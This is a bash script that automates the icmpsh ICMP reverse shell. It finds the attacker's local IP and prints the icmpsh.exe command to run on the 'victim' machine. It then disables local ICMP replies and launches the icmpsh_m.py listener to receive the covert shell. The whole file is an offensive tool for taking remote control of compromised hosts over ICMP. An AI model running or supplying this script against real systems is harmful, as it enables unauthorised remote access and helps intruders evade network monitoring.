#!/usr/bin/env bash
# icmp shell script
# Daniel Compton
# 05/2013
# Edited by SLAYER OWNER @ 2018
# changelog:
#  - grep any network interface

if [[ "$#" -ne 1 ]]; then
        echo -e  "Usage: "\
"$0 -t <target ip>"
        exit 1
fi

if [[ "$EUID" -ne 0 ]]; then
        echo "[!] WARNING: Permission root is required"
        exit 1
fi

echo ""
echo ""
echo -e "\e[00;32m##################################################################\e[00m"
echo ""
echo "ICMP Shell Automation Script for"
echo ""
echo "https://github.com/inquisb/icmpsh"
echo ""
echo -e "\e[00;32m##################################################################\e[00m"

echo ""
IPINT=$(ifconfig | grep ":" | cut -d ":" -f 1 | head -1)
IP=$(ifconfig "$IPINT" | grep -Eo "inet [0-9.]+" | cut -d " " -f2)
echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m What is the victims public IP address?"
echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
echo ""
echo -e "\e[01;32m[-]\e[00m Run the following code on your victim system on the listender has started:"
echo ""
echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
echo ""
echo "icmpsh.exe -t "$IP" -d 500 -b 30 -s 128"
echo ""
echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
echo ""
LOCALICMP=$(cat /proc/sys/net/ipv4/icmp_echo_ignore_all)
if [ "$LOCALICMP" -eq 0 ]
                then 
                                echo ""
                                echo -e "\e[01;32m[-]\e[00m Local ICMP Replies are currently enabled, I will disable these temporarily now"
                                sysctl -w net.ipv4.icmp_echo_ignore_all=1 >/dev/null
                                ICMPDIS="disabled"
                else
                                echo ""
fi
echo ""
echo -e "\e[01;32m[-]\e[00m Launching Listener...,waiting for a inbound connection.."
echo ""
python icmpsh_m.py "$IP" "$1"
if [ "$ICMPDIS" = "disabled" ]
                then
                                echo ""
                                echo -e "\e[01;32m[-]\e[00m Enabling Local ICMP Replies again now"
                                sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null
                                echo ""
                else
                                echo ""
fi

exit 0

